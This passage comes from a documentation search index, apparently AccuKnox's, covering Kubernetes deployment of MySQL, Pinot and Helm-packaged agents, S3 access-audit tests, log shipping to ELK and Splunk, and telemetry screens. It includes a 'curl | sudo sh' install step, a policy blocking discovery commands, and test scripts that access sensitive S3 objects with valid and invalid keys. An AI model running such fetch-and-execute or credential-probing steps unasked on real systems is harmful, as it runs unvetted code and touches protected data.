set-context $(kubectl config current-context) --namespace=accuknox-dev-mysql\n</code></pre></li> <li>Change Directory <pre><code>cd accuknox-dev-mysql\n</code></pre></li> <li>Apply the yaml files - in the order below <pre><code>kubectl apply -f bundle.yaml \nkubectl apply -f cr.yaml \nkubectl apply -f secrets.yaml \nkubectl apply -f ssl-secrets.yaml \nkubectl apply -f backup-s3.yaml\n</code></pre></li> <li>Run a sanitary test with below commands at the mysql namespace <pre><code>kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -- bash -il\n</code></pre></li> <li> <p>Login to MySql <pre><code>mysql -h accuknox-dev-mysql-haproxy -uroot -proot_password\n</code></pre> After successfully logging in, run any sanitary mysql query and validate it.</p> </li> <li> <p>Update the passwords in secret.yaml file and run below command <pre><code>kubectl apply -f secrets.yaml\n</code></pre></p> </li> <li>Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application connectivity <pre><code>FQDN: accuknox-dev-mysql-haproxy.accuknox-dev-mysql.svc.cluster.local\n</code></pre></li> </ol>"},{"location":"s3-data-protection/mysql-operator-deployment/#optional","title":"Optional","text":"<p>To configure backup with GCS, add the HMAC keys in <code>backup-s3.yaml</code>, change the bucket name in <code>cr.yaml</code> and cron can be changed as required <code>cr.yaml</code> files.</p>"},{"location":"s3-data-protection/overview/","title":"S3 Data Protection - Installation &amp; Deployment Steps for Various Modules","text":""},{"location":"s3-data-protection/overview/#installation-flow","title":"Installation Flow","text":""},{"location":"s3-data-protection/overview/#1-backend-platform","title":"1. Backend Platform","text":"<ul> <li>Kubernetes cluster</li> <li>Installing the backend software components in the kubernetes cluster<ol> <li>Setup Databases - MySQL, Pinot</li> <li>Setup Kafka</li> <li>Install Istio in Kubernetes</li> <li>Microservices</li> <li>Setup Istio API Gateway (Internal)</li> </ol> </li> </ul>"},{"location":"s3-data-protection/overview/#2-ui-frontend","title":"2. UI - Frontend","text":"<ul> <li>Setup a VM with Nginx as webserver and point to the HTML UI build</li> </ul>"},{"location":"s3-data-protection/overview/#3-s3-data-audit-poc","title":"3. S3 Data Audit POC","text":"<ol> <li>Setup 5 S3 buckets (5 for Data Bucket, atleast 1 bucket for logs).</li> <li>Populate some files using the provided script.</li> <li>Setup the S3 Audit Log Reporter Agent in a VM.</li> <li>Configure the data buckets and logs buckets in YAML file.</li> </ol> <p>Note: Please install the pre-requisites below before proceeding with deploying the modules:</p> <ul> <li>MySql Operator</li> <li>Kafka Operator</li> <li>Pinot Deployment Steps</li> <li>Istio &amp; it's gateway installation</li> </ul>"},{"location":"s3-data-protection/overview/#architecture-diagram","title":"Architecture Diagram","text":""},{"location":"s3-data-protection/overview/#data-protection","title":"Data Protection","text":""},{"location":"s3-data-protection/overview/#1-data-protection-management","title":"1. Data-protection-management","text":"<ul> <li> <p>Download tgz file of data-protection-management <pre><code>data-protection-mgmt.tar.gz\n</code></pre></p> </li> <li> <p>Create namespace for data-protection-management <pre><code>kubectl create namespace accuknox-dev-data-protection-mgmt\n</code></pre></p> </li> <li> <p>Install using Helm <pre><code>helm upgrade --install data-protection- mgmt data-protection-mgmt.tar.gz \u2013n accuknox-dev-data-protection-mgmt\n</code></pre></p> </li> <li> <p>Verify the installation of data-protection-management <pre><code>kubectl get pods -n accuknox-dev-data-protection-mgmt\n</code></pre></p> </li> </ul>"},{"location":"s3-data-protection/overview/#2-s3-audit-reporter-consumer","title":"2. s3-audit-reporter-consumer","text":"<ul> <li>Download tgz file of s3-audit-reporter-consumer <pre><code>s3-audit-reporter-consumer-charts.tar.gz\n</code></pre></li> <li>Create namespace for s3-audit-reporter-consumer <pre><code>kubectl create namespace accuknox-dev- s3-audit-reporter-consumer\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install s3-audit-reporter-consumer s3-audit-reporter- consumer-charts.tar.gz \u2013n accuknox-dev- s3-audit-reporter-consumer\n</code></pre></li> <li>Verify the installation of s3-audit-reporter-consumer <pre><code>kubectl get pods -n accuknox-dev- s3-audit-reporter-consumer\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#3-agent-data-collector","title":"3. agent-data-collector","text":"<ul> <li>Download tgz file of agent-data-collector <pre><code>agent-data-collector-charts.tar.gz\n</code></pre></li> <li>Create namespace for agent-data-collector <pre><code>kubectl create namespace accuknox-dev- agent-data-collector\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install agent-data-collector agent-data-collector-\ncharts.tar.gz \u2013n accuknox-dev- agent-data-collector\n</code></pre></li> <li>Verify the installation of agent-data-collector <pre><code>kubectl get pods -n accuknox-dev- agent-data-collector\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#4-s3-audit-reporter","title":"4. s3-audit-reporter","text":"<ul> <li>Download tgz file of s3-audit-reporter <pre><code>s3-audit-reporter-charts.tar.gz\n</code></pre></li> <li>Untar the file <pre><code>tar -xvf s3-audit-reporter.tar.gz\n</code></pre></li> <li>Move to the directory of s3-audit-reporter <pre><code>cd s3-audit-reporter\n</code></pre></li> <li>Create namespace for s3-audit-reporter <pre><code>kubectl create namespace [namespace]\n</code></pre></li> <li>Install Configmap using kubectl, please update with your bucket details <pre><code>kubectl apply \u2013f dev-config.yaml \u2013n [namespace]\n</code></pre></li> <li>Install Secrets using kubectl <pre><code>kubectl apply \u2013f dev-image-secrets.yaml\u2013n [namespace]\nkubectl apply \u2013f dev-deployment.yaml\u2013n [namespace]\n</code></pre></li> <li>Verify the installation of s3-audit-reporter <pre><code>kubectl get pods -n [namespace]\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#data-pipeline","title":"Data Pipeline","text":""},{"location":"s3-data-protection/overview/#1-data-pipeline-api","title":"1. data-pipeline-api","text":"<ul> <li>Download tgz file <pre><code>data-pipeline-api-charts.tar.gz\n</code></pre></li> <li>Create namespace for data-pippeline-api <pre><code>kubectl create namespace accuknox-dev- datapippeline-api\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install data-pipeline-api data-pipeline-api-charts.tar.gz \u2013n accuknox-dev- datapippeline-api\n</code></pre></li> <li>Verify the installation of data-pippeline-api. [Pods status should be running]  <pre><code>kubectl get pods -n accuknox-dev- datapippeline-api\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#2-datapipeline-temporal","title":"2. datapipeline-temporal:","text":"<ul> <li>Download tgz file <pre><code>datapipeline-temporal-charts.tar.gz\n</code></pre></li> <li>Create namespace for datapipeline-temporal <pre><code>kubectl create namespace accuknox-dev- temporal\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install datapipeline-temporal datapipeline-temporal-charts.tar.gz \u2013n accuknox-dev- temporal\n</code></pre></li> <li>Verify the installation of datapipeline-temporal [Pods status should be running]  <pre><code>kubectl get pods -n accuknox-dev- temporal\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#user-management","title":"User Management","text":""},{"location":"s3-data-protection/overview/#1-keycloak","title":"1. Keycloak:","text":"<ul> <li>Download tgz file of keycloak-charts.tar.gz <pre><code>keycloak.tar.gz\n</code></pre></li> <li>Create namespace for user-management-service &amp; keycloak <pre><code>kubectl create namespace accuknox-dev-user-mgmt\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install keycloak keycloak-charts.tar.gz -n accuknox-dev- user-mgmt\n</code></pre></li> <li>Verify the installation of keycloak [Pods status should be running] <pre><code>kubectl get pods -n accuknox-dev-user-mgmt\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#2-user-management-service","title":"2. user-management-service:","text":"<ul> <li>Download tgz file of user-management-service <pre><code>user-management-service.tar.gz\n</code></pre></li> <li>Install using helm <pre><code>helm upgrade --install user-mgmt user-management-service.tar.gz -n accuknox-dev-user-mgmt\n</code></pre></li> <li>Verify the installation of user-management-service [Pods status should be running] <pre><code>kubectl get pods -n accuknox-dev-user-mgmt\n</code></pre></li> </ul>"},{"location":"s3-data-protection/overview/#3-ui","title":"3. UI","text":"<ul> <li>Install nginx application on VM</li> <li>Configure the certmanager(https) (eg: letsencrypt)</li> <li>Untar the build <pre><code>tar -xvf build.tar.gz\n</code></pre> <pre><code>sudo cp -rvf build/* /usr/share/nginx/html/accuknox-app\n</code></pre></li> <li>Start the service</li> </ul>"},{"location":"s3-data-protection/pinot-deployment/","title":"Pinot Deployment","text":"<p>Note 1. Do not change the namespace name. If changes to the namespace are made, then you will need to change the service name &amp; if the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premise worker nodes with below Taints and Labels: <pre><code>Taints - pinot:true\nLabels -pinot:true\n</code></pre></p>"},{"location":"s3-data-protection/pinot-deployment/#steps","title":"Steps","text":"<ol> <li>untar pinot deployment files <pre><code>untar accuknox-pinot-dev.tar.xz\n</code></pre></li> <li>Create Namespace <pre><code>kubectl create namespace accuknox-dev-pinot\n</code></pre></li> <li>Set context <pre><code>kubectl config set-context --current --namespace=accuknox-dev-pinot\n</code></pre></li> <li>Install Helm pkg <pre><code>helm install accuknox-dev-pinot accuknox-pinot-dev/\n</code></pre></li> <li>Check the pods deployment <pre><code>kubectl get pods -n accuknox-dev-pinot\n</code></pre> </li> </ol>"},{"location":"s3-data-protection/s3-access-audit/","title":"AccuKnox S3 Access Audit","text":"<p>AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object.</p>"},{"location":"s3-data-protection/s3-access-audit/#assumptions","title":"Assumptions","text":"<ul> <li>We assume that we have the following 5 AWS S3 buckets created:</li> </ul> Sr.No. Data Bucket Name Logs Bucket Name 1. ak-exp-poc-1-data ak-exp-poc-1-logs 2. ak-exp-poc-2-data ak-exp-poc-2-data 3. ak-exp-poc-3-data ak-exp-poc-3-logs 4. ak-exp-poc-4-data ak-exp-poc-4-logs 5. ak-exp-poc-5-data ak-exp-poc-5-logs <ul> <li> <p>Data Buckets are the buckets where we store the actual data. Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Upload some files in all those buckets.</p> <ul> <li>Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html</li> <li>Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html</li> </ul> </li> <li> <p>We also assume that the S3 buckets are not public and are not accessible outside the s3-data-protection's environment.</p> </li> <li> <p>Upload multiple test files to each of the data buckets: <pre><code>unzip s3-data-protection-poc.zip cd s3-data-protection-poc/setup\nupdate &lt;access_key&gt;, &lt;secret_key&gt; and &lt;region&gt; in upload_files.sh\n</code></pre></p> </li> <li> <p>Run <code>upload_files.sh</code> for each buckets: <pre><code>./upload_files.sh &lt;bucket-name&gt;\n</code></pre></p> </li> </ul> S. No Bucket Name Command 1 ak-exp-poc-1-data ./upload_files.sh ak-exp-poc-1-data 2 ak-exp-poc-2-data ./upload_files.sh ak-exp-poc-2-data 3 ak-exp-poc-3-data ./upload_files.sh ak-exp-poc-3-data 4 ak-exp-poc-4-data ./upload_files.sh ak-exp-poc-4-data 5 ak-exp-poc-5-data ./upload_files.sh ak-exp-poc-5-data"},{"location":"s3-data-protection/s3-access-audit/#how-to","title":"How To","text":"<p>In order to setup AccuKnox S3 Access Audit perform the following steps:</p> <ol> <li>Visit AccuKnox Platform</li> <li>Login using the email and password.</li> <li>Select or create a new workspace</li> <li>On the left navigation pane, select Data Protection</li> <li>Next, select Data Sources</li> <li>Click on the Configure Data Source button at the top right corner</li> <li>Choose No for Is the s3 bucket mounted inside a container workload?</li> <li>Choose No for Is your S3 access log buckets accessible from outside your private network?</li> <li>In our scenario, we do not have S3 bucket objects accessible from outside the private network, hence click on Done.</li> <li>Follow the steps here to install the AccuKnox S3 Audit Reporter Agent.</li> <li>Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with AccuKnox Platform.</li> <li>Now, on the left navigation pane, under Data Protection, click on Sensitive Source Labels</li> <li>Enter a value for Label.</li> <li>Under S3 BUCKET on the left, select the bucket you want to configure sensitive sources from and select the objects that are sensitive on the right.</li> <li>Click on Next.</li> <li>We can skip the Configure Flagged Destination step.</li> <li>Review the selection and click on Create</li> </ol>"},{"location":"s3-data-protection/s3-access-audit/#testing-scenarios","title":"Testing Scenarios","text":"<p>Until now, we have configured sensitive sources - the objects we think are sensitive. Now, use the AWS CLI to access the files in the data buckets as mentioned here - POC Scenarios. Then, at the AccuKnox Platform, on the left navigation pane, select S3 Access Logs. Now, you should be able to see the S3 access information.</p> Heading Description BUCKET NAME The name of the bucket that the request was processed against. TIMESTAMP The time at which the request was received REQUESTER The canonical user ID of the requester, or a - for unauthenticated requests KEY The \"key\" part of the request, URL encoded, or \"-\" if the operation does not take a key parameter. In simple words, the object path. OPERATION The operation that was performed in the current request. HTTP STATUS The numeric HTTP status code of the response."},{"location":"s3-data-protection/test-scenarios/","title":"S3 Data Protection Test Scenarios:","text":"<p>Note: unzipped s3-data-protection-poc directory contains test scripts that will access sensitive objects in s3 data buckets. <pre><code>cd s3-data-protection-poc\n</code></pre></p>"},{"location":"s3-data-protection/test-scenarios/#accessing-aws-s3-bucket-access-sensitive-data-with-valid-credentials","title":"Accessing AWS S3 Bucket - Access sensitive data with valid credentials","text":"S. No Test scripts Expected Output 1. cd tests/valid_creds <code>./access_ak-exp-poc-1-data_secret1.sh &lt;access_key&gt; &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 200 2. cd tests/valid_creds <code>./access_ak-exp-poc-2-data_secret3.sh &lt;access_key&gt; &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 200 3. cd tests/valid_creds <code>./access_ak-exp-poc-3-data_secret5.sh &lt;access_key&gt; &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 200 4. cd tests/valid_creds <code>./access_ak-exp-poc-4-data_secret4.sh &lt;access_key&gt; &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 200 5. cd tests/valid_creds <code>./access_ak-exp-poc-5-data_secret6.sh &lt;access_key&gt; &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 200"},{"location":"s3-data-protection/test-scenarios/#accessing-aws-s3-bucket-access-sensitive-data-with-invalid-credentials","title":"Accessing AWS S3 Bucket - Access sensitive data with invalid credentials","text":"S. No Test scripts Expected Output 1. cd tests/invalid_creds <code>access_ak-exp-poc-1-data_secret1_invalid_accessKey.sh &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 403 2. cd tests/invalid_creds <code>access_ak-exp-poc-2-data_secret3_invalid_accessKey.sh &lt;secret_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 403 3. cd tests/invalid_creds <code>access_ak-exp-poc-3-data_secret5._invalid_secret.sh &lt;access_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 403 4. cd tests/invalid_creds <code>access_ak-exp-poc-4-data_secret4._invalid_secret.sh &lt;access_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 403 5. cd tests/invalid_creds <code>access_ak-exp-poc-5-data_secret6._invalid_secret.sh &lt;access_key&gt; &lt;region&gt; &lt;bucket_name&gt;</code> User should see s3 access information for get-object operation of the sensitive data  in s3 access logs page. HTTP status should be 403"},{"location":"saas-elk/elk/","title":"ELK","text":""},{"location":"saas-elk/elk/#overview","title":"Overview","text":"<p>A following steps to shipping your onboard cluster logs to  Accuknox SAAS ELK</p>"},{"location":"saas-elk/elk/#step-1-edit-feeder-service-chart","title":"Step 1: Edit Feeder-service chart","text":"<pre><code>helm pull accuknox-agents/feeder-service --untar\nls feeder-service\n</code></pre> <p>Follow the below steps to update ELK endpoint:</p> <p>1.1 Open the Values.yaml</p> <p>1.2 Search the keyword [ELASTICSEARCH_HOST]</p> <p>1.3 Update the ELK endpoint or DNS (kubectl get svc -n ) <p></p>"},{"location":"saas-elk/elk/#step-2-helm-upgrade-feeder-service","title":"Step 2: Helm Upgrade Feeder-service","text":"<pre><code>helm upgrade --install feeder-service feeder-service  --set elastic.enabled=false --set kibana.enabled=false  -n accuknox-agents\n</code></pre> <p>Note: Disabling Kibana and Elastic-search helm package installing</p> <p></p>"},{"location":"saas-elk/elk/#step-3-login-in-to-kibana-dashboard","title":"Step 3: Login in to Kibana Dashboard","text":"<p>1. Apply the policy</p> <pre><code>nano nginx-kubearmor-policy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\ntags: [\"MITRE\", \"T1082\"]\nmessage: \"System owner discovery command is blocked\"\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/who\n- path: /usr/bin/w\n- path: /usr/bin/id\n- path: /usr/bin/whoami\naction: Block\n</code></pre> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml\n</code></pre> <p></p> <p>2. Violating the policy</p> <pre><code>kubectl exec -it nginx-766b69bd4b-wqnpj -- bash\n</code></pre> <p></p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <pre><code>karmor log\n</code></pre> <p></p> <p>3. Verify the logs in kibana dashboard</p> <ul> <li>Use \"kubearmor\" keyword in kibana dashboard</li> </ul> <p></p> <p>Note: </p> <p>Follow the below command If Logs are not showing in ELK: </p> <p>1. Execute in to feeder-service pod </p> <pre><code>kubectl exec -it feeder-service-7c9f847c76-fwtqj -c filebeat-sidecar -n accuknox-agents -- bash\n</code></pre> <p>2. Start the filebeat service</p> <pre><code>filebeat run -e \u201c*\u201d\n</code></pre> <p></p>"},{"location":"saas-splunk/splunk/","title":"Splunk","text":""},{"location":"saas-splunk/splunk/#overview","title":"Overview","text":"<p>A following steps to shipping your onboard cluster logs to  Accuknox SAAS Splunk</p>"},{"location":"saas-splunk/splunk/#step-1-edit-feeder-service-chart","title":"Step 1: Edit Feeder-service chart","text":"<p><pre><code>helm pull accuknox-agents/feeder-service --untar\nls feeder-service\n</code></pre> </p> <p>Follow the below steps to update splunk endpoint:</p> <p>1.1  Open the Values.yaml</p> <p>1.2  Search the keyword [ELASTICSEARCH_HOST]</p> <p>1.3  Update the Splunk endpoint or DNS (kubectl get svc -n ) <p></p>"},{"location":"saas-splunk/splunk/#step-2-helm-upgrade-feeder-service","title":"Step 2:  Helm Upgrade Feeder-service","text":"<pre><code>helm upgrade --install feeder-service feeder-service  --set elastic.enabled=false --set kibana.enabled=false  -n accuknox-agents\n</code></pre> <p>Note: Disabling Kibana and Elastic-search helm package installing</p> <p></p>"},{"location":"saas-splunk/splunk/#step-3-login-in-to-splunk-dashboard","title":"Step 3: Login in to Splunk Dashboard","text":"<p>1. Apply the policy</p> <pre><code>nano nginx-kubearmor-policy.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\ntags: [\"MITRE\", \"T1082\"]\nmessage: \"System owner discovery command is blocked\"\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/who\n- path: /usr/bin/w\n- path: /usr/bin/id\n- path: /usr/bin/whoami\naction: Block\n</code></pre> <pre><code>kubectl apply -f nginx-kubearmor-policy.yaml\n</code></pre> <p></p> <p>2. Violating the policy</p> <pre><code>kubectl exec -it nginx-766b69bd4b-wqnpj -- bash\n</code></pre> <p></p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <pre><code>karmor log\n</code></pre> <p></p> <p>3. Verify the logs in Splunk dashboard</p> <p>Use \"kubearmor\" keyword in Splunk dashboard</p> <p></p>"},{"location":"telemetry/overview/","title":"What are Telemetry Screens?","text":"<p>Telemetry screens are used to monitor the workspace and keep track of our activities, such as the HTTP requests we make and the replies we receive. It will display the information in a graphical chart with the time period on the x-axis and the response output on the y-axis. It also provides sophisticated features, such as the ability to retrieve output for specific components like, clusters, namespaces, and so on. This also implies that we may filter our data for a given time span based on cluster, namespace, pod, and other factors.</p> <p>This section will explain in detail about the telemetry screen in detail for the following components:</p> <p>Telemetry Screen for Kubernetes clusters</p> <p>Telemetry Screen for Virtual Machine</p>"},{"location":"telemetry/telemetry-gke/","title":"Telemetry Screen for Kubernetes","text":"<p>The data on the telemetry panel is separated into four categories.</p> <ul> <li>Network</li> <li>System</li> <li>Anomaly Detection</li> <li>Data Protection</li> </ul>"},{"location":"telemetry/telemetry-gke/#network","title":"Network","text":"<p>The network gives information about the HTTP calls and the protocols used by our sources. It also displays specific information based on the cluster, namespace, pod, and traffic direction.</p> <p></p> <p>The above image is an example of the list of HTTP calls that occur on our telemetry screen. it will display the response per sec for the HTTP GET, POST and PUT requests we made at this time, and the HTTP responses per sec if its load successfully(200) or an error(404). </p> <p></p> <p>The above image is an example of the protocol information given by the telemetry screen. It displays the information about the network protocols (ICMPv6, ICMPv4, TCP, UDP) usage and the HTTP protocols(HTTP/1.1, HTTP/2.1) usage. </p> <p></p> <p>The above image is an example of the layer 7 5xx and 4xx resquests happening per second. The graph also gives the number of forwarded and dropped operation happening per second.</p>"},{"location":"telemetry/telemetry-gke/#system","title":"System","text":"<p>The system graphs gives information about the system policy logs. It shows the severity level of the logs and the action happened. It also gives specific information based on the cluster, namespace, container, pod, hostname, and the policy we applied.</p> <p></p> <p>The above image is an example of system policy logs on the telemetry screen which displays severity logs along with action logs.</p> <p></p> <p>The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given operation and number of logs with a given host</p> <p></p> <p>The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given namespace and number of logs with a given pod</p> <p></p> <p>The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given container and number of logs with a given policy</p> <p></p> <p>The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given type</p>"},{"location":"telemetry/telemetry-gke/#anomaly-detection","title":"Anomaly Detection","text":"<p>Anomaly Detection displays the information about the anomalies occurring on our sources. It displays the information about the errors that occurred and the process activities happened. It also displays specific informations based on the cluster, namespace, and container.</p> <p></p> <p>The above image is an example of anomaly detection telemetry occurring on the SaaS telemetry screen. It displays the count of errors or baseline that occurred at a time and it gives the count of process activities(forked, executed, killed) and total process count.</p>"},{"location":"telemetry/telemetry-gke/#data-protection","title":"Data Protection","text":"<p>Data Protection gives information about unauthorized users trying to access sensitive sources. It also gives the information based on cluster, container, namespace, and node.</p> <p></p> <p>The above image is an example of data protection telemetry occurring on SaaS telemetry screens. It plots the graphs with</p> <ol> <li>Flagged destination access on sensitive data </li> <li>Unknown destination access on sensitive data </li> <li>Total number of access on each sensitive data</li> <li>Total number of alerts generated with severity </li> </ol>"},{"location":"workspace-manager/channel-integration-overview/","title":"Overview","text":"<p>AccuKnox employs alerts when policy violations occur. Alerts can be delivered via a number of supported notification channels.</p> <p>In the <code>Workspace Manager</code>, configure the notification channels to be used for alerting.</p> <p>This guide describes how to add, edit, or delete a variety of notification channel types.</p>"},{"location":"workspace-manager/edit-integration/","title":"Edit a Notification Channel","text":""},{"location":"workspace-manager/edit-integration/#editing-a-notification-channel","title":"Editing a notification channel","text":"<p>To edit an integration(notification channel), Follow these steps:</p> <ol> <li> <p>Go to  Workspace Manager &gt; Channel Integrations &gt; View Integration List.</p> </li> <li> <p>Click on the channel which you want to edit     The integration opens.</p> </li> <li> <p>Apply your changes to the integration by editing the field values. </p> </li> <li> <p>Click  Test and If the test was successful, the integration is good to be saved., if the test was unsuccessful, user need to recheck the fields values. </p> </li> <li>Click Save.</li> </ol>"},{"location":"workspace-manager/manage-instance-group/","title":"Manage instance groups","text":""},{"location":"workspace-manager/manage-instance-group/#create-instance-group","title":"Create Instance Group","text":"<ol> <li>Log in to Accuknox and select <code>Manage Instance Group</code> from the <code>Workspace Manager</code> menu.   </li> <li>Click the <code>Create Instance Group</code> button.</li> <li>Enter the Instance group name.  </li> <li>Click Save.</li> </ol> <p>Note: Instances can be onboarded into created VM Instance Group on the VM Onboarding page.</p>"},{"location":"workspace-manager/manage-instance-group/#edit-instance-group","title":"Edit Instance Group","text":"<ol> <li>Log in to Accuknox and select <code>Manage Instance Group</code> from the <code>Workspace Manager</code> menu. </li> <li>Click the <code>Edit</code> button.</li> <li>Enter the new Instance group name.</li> <li>Click Save Changes.</li> </ol>"},{"location":"workspace-manager/manage-instance-group/#delete-instance-group","title":"Delete Instance Group","text":"<ol> <li>Log in to Accuknox and select <code>Manage Instance Group</code> from the <code>Workspace Manager</code> menu. </li> <li>Click the <code>Delete</code> button.</li> <li>Click Delete to delete the Instance Group, or click Cancel to revert the unsaved changes.</li> </ol>"},{"location":"workspace-manager/manage-onboarded-clusters/","title":"Manage onboarded cluster","text":""},{"location":"workspace-manager/manage-onboarded-clusters/#view-onboarded-clusters","title":"View Onboarded Clusters","text":"<ol> <li>Log in to Accuknox and select <code>Manage Onboarded Clusters</code>     from the <code>Workspace Manager</code> menu.</li> <li>Onboarded Clusters can be viewed here.</li> </ol>"},{"location":"workspace-manager/manage-onboarded-clusters/#install-agents-in-onboarded-clusters","title":"Install Agents in Onboarded Clusters","text":"<ol> <li>Log in to Accuknox and select <code>Manage Onboarded Clusters</code>     from the <code>Workspace Manager</code> menu.</li> <li>Select the Cluster and click Next button.</li> </ol> <p>On the <code>Workspace Manager</code> page, under <code>Manage Onboarded Clusters</code>, Select the Cluster and click Next . You can view the following Pre-requisites and List of Agents:</p> <ul> <li>Pre-requisites<ul> <li>Create Namespace</li> <li>Adding AccuKnox Helm repository</li> </ul> </li> <li>Cilium</li> <li>KubeArmor</li> <li>Feeder Service</li> <li>Shared Informer Agent</li> <li>Policy Enforcement Agent</li> <li>Data Protection</li> </ul> <p></p>"},{"location":"workspace-manager/manage-onboarded-clusters/#pre-requisites","title":"Pre-requisites","text":""},{"location":"workspace-manager/manage-onboarded-clusters/#create-namespace","title":"Create Namespace","text":"<pre><code>kubectl create namespace accuknox-agents\n</code></pre>"},{"location":"workspace-manager/manage-onboarded-clusters/#adding-accuknox-helm-repository","title":"Adding AccuKnox Helm repository","text":"<p>Required incase of installing by Helm</p> <p>Add AccuKnox repository to install agents helm package <pre><code>helm repo add accuknox-agents https://username:password@agents.accuknox.com/repository/accuknox-agents\n</code></pre></p> <p>Note: Change credentials as per UI.   </p> <p>Once repository added successfully, update the helm repository <pre><code>helm repo update\n</code></pre></p>"},{"location":"workspace-manager/manage-onboarded-clusters/#1-cilium","title":"1. Cilium","text":"<p>Installation Guide</p> <p>Description  This agent is used to apply network policies</p> <p>Download Cilium CLI</p> <p><pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> Install Cilium <pre><code>cilium install\n</code></pre> Enable Hubble in Cilium <pre><code>cilium hubble enable\n</code></pre></p>"},{"location":"workspace-manager/manage-onboarded-clusters/#2-kubearmor","title":"2. KubeArmor","text":"<p>Installation Guide</p> <p>Description  This agent is used to apply system level policies</p> <p>Download and install karmor CLI <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> Install KubeArmor <pre><code>karmor install\n</code></pre></p>"},{"location":"workspace-manager/manage-onboarded-clusters/#3-feeder-service","title":"3. Feeder Service","text":"<p>Installation Guide</p> <p>Description  Feeder service deployment that collects feeds from Kubearmor and Cilium.</p> <p>Helm  To Install agents on destination cluster <pre><code>helm upgrade --install feeder-service accuknox-agents/feeder-service -n accuknox-agents\n</code></pre> Set the env of Feeder Service <pre><code>kubectl set env deploy/feeder-service -n accuknox-agents tenant_id=000 cluster_id=000\n</code></pre></p> <p>Note: The <code>tenant_id</code> &amp; <code>cluster_id</code> will vary according to different clusters.</p>"},{"location":"workspace-manager/manage-onboarded-clusters/#4-shared-informer-agent","title":"4. Shared Informer Agent","text":"<p>Installation Guide</p> <p>Description  this agent authenticates with your cluster and collects information regarding entities like nodes, pods &amp; namespaces.</p> <p>Helm  To Install agents on destination cluster <pre><code>helm upgrade --install shared-informer-agent-chart accuknox-agents/shared-informer-agent-chart -n accuknox-agents\n</code></pre></p>"},{"location":"workspace-manager/manage-onboarded-clusters/#5-policy-enforcement-agent","title":"5. Policy Enforcement Agent","text":"<p>Installation Guide</p> <p>Description  This agent authenticates with your cluster and enforces label and policy.</p> <p>Helm  To Install agents on destination cluster <pre><code>helm upgrade --install policy-enforcement-agent accuknox-agents/policy-enforcement-agent-chart -n accuknox-agents\n</code></pre> Set the env of policy-enforcement-agent <pre><code>kubectl set env deploy/policy-enforcement-agent -n accuknox-agents workspace_id=000\n</code></pre></p> <p>Note: The <code>workspace_id</code> will vary according to different 